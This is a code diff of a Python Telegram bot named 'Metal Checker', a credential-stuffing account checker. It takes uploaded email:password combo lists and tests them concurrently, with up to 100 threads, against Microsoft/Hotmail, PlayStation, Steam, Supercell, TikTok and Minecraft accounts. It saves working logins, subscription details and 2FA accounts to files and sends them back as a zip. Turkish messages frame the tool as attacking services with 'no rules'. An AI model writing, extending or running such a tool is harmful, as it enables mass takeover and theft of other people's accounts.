-                    with open(os.path.join(self.xbox_folder, "xbox_premium.txt"), "a", encoding="utf-8") as f:
-                        f.write(f"{res['email']}:{res['password']} | Subs: {json.dumps(res['subscriptions'])}\n")
-                elif res.get("psn_status") == "HAS_ORDERS":
-                    with open(os.path.join(self.psn_folder, "psn_has_orders.txt"), "a", encoding="utf-8") as f:
-                        f.write(f"{res['email']}:{res['password']} | Orders: {res['psn_orders']}\n")
-                elif res.get("steam_status") == "HAS_PURCHASES":
-                    with open(os.path.join(self.steam_folder, "steam_has_purchases.txt"), "a", encoding="utf-8") as f:
-                        f.write(f"{res['email']}:{res['password']} | Count: {res['steam_count']}\n")
-                else:
-                    with open(os.path.join(self.other_hits, "hits.txt"), "a", encoding="utf-8") as f: f.write(line)
-
+                with open(self.expired_subs, 'a', encoding='utf-8') as f:
+                    f.write(line)
+                    
     def save_2fa(self, email, password):
-        with file_lock:
-            with open(self.two_fa_file, "a", encoding="utf-8") as f:
-                f.write(f"{email}:{password}\n")
+        with open(self.two_fa_file, 'a', encoding='utf-8') as f:
+            f.write(f"{email}:{password}\n")
 
-# ══════════════════════════════════════════════════════════════════════
-#  TELEGRAM BOT CONTROLLERS & UI
-# ══════════════════════════════════════════════════════════════════════
+    def zip_results(self):
+        zip_name = f"{self.base_folder}.zip"
+        shutil.make_archive(self.base_folder, 'zip', self.base_folder)
+        return zip_name
+
+
+class LiveStats:
+    def __init__(self, total, chat_id):
+        self.chat_id = chat_id
+        self.total = total
+        self.checked = 0
+        self.hits = 0
+        self.two_fa = 0
+        self.bads = 0
+        self.errors = 0
+        self.ms_premium = 0
+        self.ms_expired = 0
+        self.start_time = time.time()
+        self.lock = Lock()
+        self.hit_logs = []
+        self.message_id = None
+        
+    def update(self, status, result_data=None):
+        with self.lock:
+            self.checked += 1
+            if status == "HIT":
+                self.hits += 1
+                if result_data:
+                    subs = result_data.get("subscriptions", [])
+                    has_active = any(not s.get('is_expired', False) and s.get('days_remaining', '?') != '?' for s in subs)
+                    if has_active: self.ms_premium += 1
+                    elif subs: self.ms_expired += 1
+            elif status == "2FA": self.two_fa += 1
+            elif status in ["BAD", "ERROR", "TIMEOUT"]: self.bads += 1
+
+    def generate_text(self):
+        with self.lock:
+            elapsed = time.time() - self.start_time
+            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
+            progress = (self.checked / self.total * 100) if self.total > 0 else 0
+            
+            text = f"⚙️ *METAL CHECKER - LIVE RESULTS* ⚙️\n"
+            text += f"━━━━━━━━━━━━━━━━━━━━\n"
+            text += f"🟢 *Hits:* `{self.hits}`\n"
+            text += f"🟡 *2FA:* `{self.two_fa}`\n"
+            text += f"🔴 *Bad:* `{self.bads}`\n"
+            text += f"━━━━━━━━━━━━━━━━━━━━\n"
+            text += f"🎮 *Active Subs:* `{self.ms_premium}`\n"
+            text += f"💀 *Expired Subs:* `{self.ms_expired}`\n"
+            text += f"━━━━━━━━━━━━━━━━━━━━\n"
+            text += f"📊 *Progress:* `{self.checked}/{self.total} ({progress:.1f}%)`\n"
+            text += f"🚀 *CPM:* `{int(cpm)}`\n"
+            text += f"⚡️ *Coded by Metal Drops & Icardi*\n"
+            return text
+
+
+# -----------------------------------------
+# BOT HANDLERS & MENUS
+# -----------------------------------------
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    welcome_text = (
-        "⚡ *Welcome to Metal Checker Infrastructure* ⚡\n\n"
-        "▫️ *Developer:* `@vantrexXxx`\n"
-        "▫️ *Powered by:* `Metal Drops`\n\n"
-        "Please choose a checking engine module from below component matrix to begin structure pipeline:"
+    chat_id = message.chat.id
+    user_states[chat_id] = "IDLE"
+    user_configs[chat_id] = {"mode": "both", "api": 2, "threads": 10, "keywords": []}
+    
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("🚀 Metal Checker Başlat", callback_data="menu_services"))
+    
+    bot.send_message(
+        chat_id, 
+        "🤘 *Metal Drops & Icardi Sunar: METAL CHECKER*\n\nHoş geldin. Sınır yok, kural yok. Ne lazımsa parçalar geçeriz. Botu kurmak için aşağıdaki butona tıkla.",
+        parse_mode="Markdown",
+        reply_markup=markup
     )
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_xbox = types.InlineKeyboardButton("🎮 Xbox Checker (All-in-One)", callback_data="set_mode_both")
-    btn_inbox = types.InlineKeyboardButton("📥 Inbox Checker", callback_data="set_mode_inbox")
-    markup.add(btn_xbox, btn_inbox)
-    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
 
-@bot.callback_query_handler(func=lambda call: call.data in ["set_mode_both", "set_mode_inbox"])
-def ask_threads_count(call):
-    with state_lock:
-        if call.from_user.id in active_scans:
-            bot.answer_callback_query(call.id, "⚠️ You have an active running session!")
-            return
-            
-    mode = "both" if call.data == "set_mode_both" else "inbox"
-    msg = bot.send_message(call.message.chat.id, "🔢 How many threads would you like to run? (Enter a number between 1 and 100):")
-    bot.register_next_step_handler(msg, process_thread_input, mode)
-    bot.answer_callback_query(call.id)
+@bot.message_handler(commands=['stop'])
+def stop_checker(message):
+    chat_id = message.chat.id
+    if chat_id in active_tasks and active_tasks[chat_id]:
+        stop_flags[chat_id] = True
+        bot.send_message(chat_id, "🛑 İşlem durduruluyor... Sonuçlar anında paketlenip gönderilecek.")
+    else:
+        bot.send_message(chat_id, "Şu an çalışan bir işlem yok.")
 
-def process_thread_input(message, mode):
-    try:
-        threads = int(message.text.strip())
-        if not (1 <= threads <= 100): raise ValueError()
-    except:
-        msg = bot.send_message(message.chat.id, "❌ Invalid thread number. Enter a valid integer between 1 and 100:")
-        bot.register_next_step_handler(msg, process_thread_input, mode)
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
+    chat_id = call.message.chat.id
+    data = call.data
+    
+    if data == "menu_services":
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("1. Hotmail Only", callback_data="srv_hotmail"),
+            InlineKeyboardButton("2. Microsoft Subs", callback_data="srv_microsoft"),
+            InlineKeyboardButton("3. PlayStation", callback_data="srv_psn"),
+            InlineKeyboardButton("4. Steam", callback_data="srv_steam"),
+            InlineKeyboardButton("5. Supercell", callback_data="srv_supercell"),
+            InlineKeyboardButton("6. TikTok", callback_data="srv_tiktok"),
+            InlineKeyboardButton("7. Minecraft", callback_data="srv_minecraft"),
+            InlineKeyboardButton("8. Full Scan", callback_data="srv_both")
+        )
+        bot.edit_message_text("🎯 *SERVICE SELECTION*\nHangi servisleri vurmak istersin?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        
+    elif data.startswith("srv_"):
+        mode = data.split("_")[1]
+        user_configs[chat_id]["mode"] = mode
+        
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton("1. Full API (Yavaş & Kapsamlı)", callback_data="api_1"),
+            InlineKeyboardButton("2. Fast API (Önerilen)", callback_data="api_2"),
+            InlineKeyboardButton("3. Minimal API (Çok Hızlı)", callback_data="api_3")
+        )
+        bot.edit_message_text("⚙️ *API MODE*\nAPI hızı/kalitesi ne olsun?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        
+    elif data.startswith("api_"):
+        api_lvl = int(data.split("_")[1])
+        user_configs[chat_id]["api"] = api_lvl
+        
+        markup = InlineKeyboardMarkup(row_width=3)
+        markup.add(
+            InlineKeyboardButton("10 Thread", callback_data="thr_10"),
+            InlineKeyboardButton("30 Thread", callback_data="thr_30"),
+            InlineKeyboardButton("50 Thread", callback_data="thr_50"),
+            InlineKeyboardButton("100 Thread", callback_data="thr_100")
+        )
+        bot.edit_message_text("🚀 *THREADING*\nKaç eşzamanlı koldan saldıralım?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+
+    elif data.startswith("thr_"):
+        threads = int(data.split("_")[1])
+        user_configs[chat_id]["threads"] = threads
+        user_states[chat_id] = "WAITING_FOR_COMBO"
+        
+        bot.edit_message_text(
+            f"✅ *METAL CHECKER HAZIR!*\n\n"
+            f"Servis: `{user_configs[chat_id]['mode'].upper()}`\n"
+            f"Threads: `{threads}`\n\n"
+            f"🔥 *Şimdi combo dosyanı (.txt) gönder.* Geldiği an tarama otomatik başlayacak. Durdurmak ve sonuçları anında almak istersen `/stop` yazman yeterli.",
+            chat_id, call.message.message_id, parse_mode="Markdown"
+        )
+
+
+@bot.message_handler(content_types=['document', 'text'])
+def handle_combo(message):
+    chat_id = message.chat.id
+    
+    if user_states.get(chat_id) != "WAITING_FOR_COMBO":
         return
-
-    msg = bot.send_message(message.chat.id, "📝 Please upload a .txt file or paste your account list details (`email:password` format):")
-    bot.register_next_step_handler(msg, process_combo_input, mode, threads)
-
-def process_combo_input(message, mode, threads):
-    combo_text = ""
-    if message.document:
+        
+    lines = []
+    if message.content_type == 'document':
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        combo_text = downloaded_file.decode("utf-8", errors="ignore")
-    elif message.text:
-        combo_text = message.text
-    else:
-        bot.send_message(message.chat.id, "❌ Invalid input. Please use `/start` to reset.")
-        return
-
-    lines = combo_text.strip().split("\n")
-    accounts = []
-    for line in lines:
-        parts = line.strip().split(":")
-        if len(parts) >= 2:
-            accounts.append((parts[0].strip(), parts[1].strip()))
-
-    if not accounts:
-        bot.send_message(message.chat.id, "❌ Zero valid accounts found in list. Process closed.")
-        return
-
-    status_msg = bot.send_message(
-        message.chat.id, 
-        "⏳ *Metal Checker Framework Initializing Dynamic Threads...*\n"
-        "Please wait while pipeline loads tracking data.",
-        parse_mode="Markdown"
-    )
-
-    task_id = str(uuid.uuid4())[:8]
-    rm = DynamicResultManager(task_id, check_mode=mode)
-    
-    scan_state = {
-        "total": len(accounts),
-        "checked": 0,
-        "hits": 0,
-        "xbox_hits": 0,
-        "psn_hits": 0,
-        "steam_hits": 0,
-        "bads": 0,
-        "twofa": 0,
-        "status_msg_id": status_msg.message_id,
-        "chat_id": message.chat.id,
-        "rm": rm,
-        "start_time": time.time(),
-        "last_update_time": 0,  # 5 Saniyelik Throttling Icin Sifirlandi
-        "is_running": True,
-        "check_mode": mode,
-        "threads": threads
-    }
-
-    with state_lock:
-        active_scans[message.from_user.id] = scan_state
-
-    threading.Thread(target=run_checker_pool, args=(message.from_user.id, accounts), daemon=True).start()
-
-def run_checker_pool(user_id, accounts):
-    with state_lock:
-        state = active_scans.get(user_id)
-    if not state: return
-
-    max_workers = state["threads"]
-    
-    def process_single(acc):
-        with state_lock:
-            if not state["is_running"]: return False
-            
-        email, password = acc
-        checker = UnifiedChecker(check_mode=state["check_mode"])
-        
         try:
-            res = checker.check(email, password)
-        except Exception:
-            res = {"status": "BAD"}
-
-        with state_lock:
-            state["checked"] += 1
-            
-            if res.get("status") == "HIT":
-                state["hits"] += 1
-                if state["check_mode"] == "both":
-                    if res.get("ms_status") == "PREMIUM" or len(res.get("subscriptions", [])) > 0:
-                        state["xbox_hits"] += 1
-                    if res.get("psn_status") == "HAS_ORDERS":
-                        state["psn_hits"] += 1
-                    if res.get("steam_status") == "HAS_PURCHASES":
-                        state["steam_hits"] += 1
-                try: state["rm"].save_result(res)
-                except: pass
-            elif res.get("status") == "2FA":
-                state["twofa"] += 1
-                try: state["rm"].save_2fa(email, password)
-                except: pass
-            else:
-                state["bads"] += 1
-
-        # Tabloyu guncellemek icin 5 saniyelik guvenli limiti cagiriyoruz
-        update_live_results(user_id)
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
-        executor.map(process_single, accounts)
-
-    finalize_scan_session(user_id)
-
-def update_live_results(user_id):
-    with state_lock:
-        state = active_scans.get(user_id)
-    if not state: return
-
-    current_time = time.time()
-    
-    # 5 SANIYE LIMITI BURADA UYGULANIYOR. Telegram api'nin kilitlenmesi engellendi.
-    if state["checked"] > 1 and (current_time - state["last_update_time"] < 5.0) and state["checked"] != state["total"]:
-        return
-
-    # Zaman kaydini kilitliyoruz ki ust uste binmesin
-    with state_lock:
-        state["last_update_time"] = current_time
-
-    elapsed = current_time - state["start_time"]
-    cpm = (state["checked"] / elapsed) * 60 if elapsed > 0 else 0
-    
-    if state["check_mode"] == "inbox":
-        live_text = (
-            "📊 *Metal Checker Infrastructure - Live Statistics (Inbox Mode)*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📥 *Total Active Hits:* `{state['hits']}`\n"
-            f"🔑 *2FA Accounts:* `{state['twofa']}`\n"
-            f"❌ *Bad Accounts:* `{state['bads']}`\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📈 *Progress Check:* `{state['checked']}` / `{state['total']}`\n"
-            f"🧵 *Threads Config:* `{state['threads']}`\n"
-            f"⚡ *Speed Rate:* `{cpm:.0f} CPM`\n"
-            f"⏱️ *Elapsed Time:* `{int(elapsed)}s`\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "🟢 _Processing framework threads dynamically..._"
-        )
-    else:
-        live_text = (
-            "📊 *Metal Checker Infrastructure - Live Statistics (All-in-One)*\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎮 *Xbox / Premium Hits:* `{state['xbox_hits']}`\n"
-            f"🔵 *PSN Hits:* `{state['psn_hits']}`\n"
-            f"💨 *Steam Hits:* `{state['steam_hits']}`\n"
-            f"✅ *Total Hits:* `{state['hits']}`\n"
-            f"🔑 *2FA Accounts:* `{state['twofa']}`\n"
-            f"❌ *Bad Accounts:* `{state['bads']}`\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📈 *Progress Check:* `{state['checked']}` / `{state['total']}`\n"
-            f"🧵 *Threads Config:* `{state['threads']}`\n"
-            f"⚡ *Speed Rate:* `{cpm:.0f} CPM`\n"
-            f"⏱️ *Elapsed Time:* `{int(elapsed)}s`\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            "🟢 _Processing framework threads dynamically..._"
-        )
-    
-    try:
-        # Mesaj direk duzenleniyor, thread engeline takilmadan akacak.
-        bot.edit_message_text(live_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
-    except Exception:
-        pass
-
-def finalize_scan_session(user_id):
-    with state_lock:
-        state = active_scans.get(user_id)
-    if not state: return
-
-    elapsed = time.time() - state["start_time"]
-    
-    if state["check_mode"] == "inbox":
-        final_text = (
-            "🏁 *Structure Verification Sequence Complete (Inbox)* 🏁\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📥 *Total Active Hits:* `{state['hits']}`\n"
-            f"🔑 *2FA Records:* `{state['twofa']}`\n"
-            f"❌ *Bad Accounts:* `{state['bads']}`\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⏱️ *Total Duration:* `{int(elapsed)} seconds`\n"
-            "📦 _Compiling architectural data storage. Sending shortly below..._"
-        )
-    else:
-        final_text = (
-            "🏁 *Structure Verification Sequence Complete (All-in-One)* 🏁\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎮 *Xbox Premium Hits:* `{state['xbox_hits']}`\n"
-            f"🔵 *PSN Hits:* `{state['psn_hits']}`\n"
-            f"💨 *Steam Hits:* `{state['steam_hits']}`\n"
-            f"✅ *All Checked Hits:* `{state['hits']}`\n"
-            f"🔑 *2FA Records:* `{state['twofa']}`\n"
-            f"❌ *Bad Accounts:* `{state['bads']}`\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⏱️ *Total Duration:* `{int(elapsed)} seconds`\n"
-            "📦 _Compiling architectural data storage. Sending shortly below..._"
-        )
-    
-    try: bot.edit_message_text(final_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
-    except: pass
-
-    folder_path = state["rm"].base_folder
-    zip_output_filename = f"{folder_path}"
-    
-    if os.path.exists(folder_path):
-        shutil.make_archive(zip_output_filename, 'zip', folder_path)
-        zip_file_full_path = f"{zip_output_filename}.zip"
+            content = downloaded_file.decode('utf-8')
+            lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
+        except:
+            bot.send_message(chat_id, "❌ Dosya okunamadı. UTF-8 formatında geçerli bir txt gönder.")
+            return
+    elif message.content_type == 'text':
+        lines = [l.strip() for l in message.text.split('\n') if l.strip() and ':' in l]
         
-        if os.path.exists(zip_file_full_path):
-            with open(zip_file_full_path, 'rb') as doc:
-                bot.send_document(
-                    state["chat_id"], 
-                    doc, 
-                    caption="✅ *Verification results structured successfully inside directory archive!*",
-                    parse_mode="Markdown"
-                )
-            try:
-                os.remove(zip_file_full_path)
-                shutil.rmtree(folder_path)
-            except: pass
+    if not lines:
+        bot.send_message(chat_id, "❌ Combolar bulunamadı. İçinde 'email:pass' formatı olan bir şey at.")
+        return
+        
+    # Start process
+    user_states[chat_id] = "CHECKING"
+    stop_flags[chat_id] = False
+    active_tasks[chat_id] = True
     
-    with state_lock:
-        if user_id in active_scans:
-            del active_scans[user_id]
+    config = user_configs[chat_id]
+    result_mgr = ResultManager(chat_id, config["mode"])
+    stats = LiveStats(len(lines), chat_id)
+    
+    msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
+    stats.message_id = msg.message_id
+    
+    def process_line(line):
+        if stop_flags.get(chat_id, False): return
+        try:
+            parts = line.split(':', 1)
+            if len(parts) != 2: 
+                stats.update("BAD")
+                return
+            checker = UnifiedChecker(keywords=config["keywords"], api_mode=config["api"], check_mode=config["mode"])
+            res = checker.check(parts[0].strip(), parts[1].strip())
+            stats.update(res["status"], res if res["status"] == "HIT" else None)
+            
+            if res["status"] == "HIT":
+                result_mgr.save_hit(res)
+            elif res["status"] == "2FA":
+                result_mgr.save_2fa(parts[0].strip(), parts[1].strip())
+        except:
+            stats.update("ERROR")
 
-@bot.message_handler(func=lambda m: True)
-def default_catchall(message):
-    send_welcome(message)
+    # Live update thread - exactly every 2 seconds
+    def ui_updater():
+        while active_tasks.get(chat_id, False):
+            time.sleep(2.0)
+            if not active_tasks.get(chat_id, False): break # double check
+            try:
+                bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
+            except: pass
+
+    updater_thread = Thread(target=ui_updater)
+    updater_thread.start()
+
+    # Worker pool
+    with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
+        for line in lines:
+            if stop_flags.get(chat_id, False): break
+            executor.submit(process_line, line)
+            
+    # Process finished or stopped
+    active_tasks[chat_id] = False
+    updater_thread.join()
+    
+    # Final edit
+    try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *TARAMA BİTTİ VEYA DURDURULDU!*", chat_id, stats.message_id, parse_mode="Markdown")
+    except: pass
+    
+    bot.send_message(chat_id, "📦 Sonuçlar zıpleniyor...")
+    zip_path = result_mgr.zip_results()
+    
+    with open(zip_path, 'rb') as f:
+        bot.send_document(chat_id, f, caption="🔥 *METAL CHECKER - SONUÇLAR*\n\nIcardi & Metal Drops gururla sundu.", parse_mode="Markdown")
+        
+    # Cleanup
+    try: shutil.rmtree(result_mgr.base_folder)
+    except: pass
+    try: os.remove(zip_path)
+    except: pass
+    
+    user_states[chat_id] = "IDLE"
 
 if __name__ == "__main__":
-    print("=====================================================")
-    print("  Metal Checker Security Bot Initializing...         ")
-    print("  Developer: @vantrexXxx                             ")
-    print("  Powered by: Metal Drops                            ")
-    print("=====================================================")
-    
-    try:
-        bot.delete_webhook(drop_pending_updates=True)
-        time.sleep(1) 
-    except Exception as error_msg:
-        print(f"[!] Webhook cleanup warning: {error_msg}")
-
-    bot.infinity_polling()
-
+    print("[DEBUG] Metal Checker Telegram Bot başlatılıyor...")
+    bot.infinity_polling(timeout=60, long_polling_timeout=60)
 
